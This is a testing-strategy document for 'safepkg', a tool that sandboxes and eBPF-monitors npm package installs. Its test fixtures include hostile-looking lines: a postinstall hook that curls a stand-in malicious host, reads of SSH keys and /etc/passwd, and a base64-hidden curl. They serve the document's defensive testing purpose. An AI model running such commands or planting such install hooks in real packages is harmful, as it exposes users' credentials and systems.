# Testing Strategy: SafePkg

To ensure the security and reliability of `safepkg`, we will implement a multi-layered testing strategy focusing on sandbox integrity, eBPF monitor accuracy, and kill-switch responsiveness.

## 0. Development Mandate: Test-Driven Development (TDD)
**Every function written for `safepkg` MUST have a corresponding unit test.**

*   **Granular Testing**: No function is too small. Whether it's a path utility, a TOML parser, or an eBPF event decoder, it must be verified.
*   **Proof of Correctness**: For every feature or bug fix, a test must be written *before* or *during* implementation to prove the logic works as intended.
*   **Coverage**: We will use `cargo-tarpaulin` to monitor code coverage, aiming for 100% coverage on core security logic.

## 1. Unit Testing (Rust)
...
*   **Rule Engine**: Test the TOML parser and the logic that determines if a syscall or path is allowed.
*   **Path Normalization**: Ensure that malicious paths (e.g., `../../.ssh`) are correctly resolved and blocked.
*   **Metadata Parsing**: Test the extraction of package names and versions from `package.json`.

## 2. Sandbox Verification (Integration Tests)
We will use automated tests to verify that `bubblewrap` is correctly isolating the environment.
*   **FS Isolation Test**: Run a command like `safepkg cat ~/.ssh/id_rsa` and verify it returns "File not found" or "Permission denied".
*   **Network Isolation Test**: Run `safepkg curl http://google.com` and verify it fails, while `safepkg curl https://registry.npmjs.org` succeeds.
*   **Read-Only Test**: Try to `touch` a file in `/usr/bin` within the sandbox and verify it fails.

## 3. eBPF Monitoring & Kill-Switch Tests
This is the core of the tool. We will create "Safe Malware" packages for testing.
*   **The "Shadow Spawner" Test**: Create a local npm package with a `postinstall` script: `"sh -c 'curl http://malicious-site.com'`.
    *   *Expected Result*: `safepkg` should detect the `execve` for `curl`, kill the entire process tree, and return a non-zero exit code with a "Malicious Activity Detected" warning.
*   **The "Sensitive Read" Test**: A `postinstall` script that tries to read `/etc/passwd`.
    *   *Expected Result*: Even if the sandbox misses it, the eBPF monitor should catch the `openat` call and block/kill it.
*   **The "Obfuscated Script" Test**: A script that uses `base64` to hide a `curl` command.
    *   *Expected Result*: The eBPF monitor sees the *resultant* `execve` call, bypassing any string-based obfuscation.

## 4. Performance Benchmarking
*   Compare `npm install` vs `safepkg npm install` on a large project (e.g., a React app).
*   Target: Overhead should be less than 5-10% in most cases.

## 5. OS Compatibility Matrix
Test against various Linux distributions to ensure eBPF CO-RE (Compile Once – Run Everywhere) works:
*   Ubuntu 20.04/22.04/24.04
*   Fedora / RHEL
*   Debian (Stable/Testing)
*   Arch Linux

## 6. CI/CD Pipeline
*   Use **GitHub Actions** with a custom runner that has `bpf` permissions enabled.
*   Automated regression tests for every PR to ensure new features don't break the security guardrails.
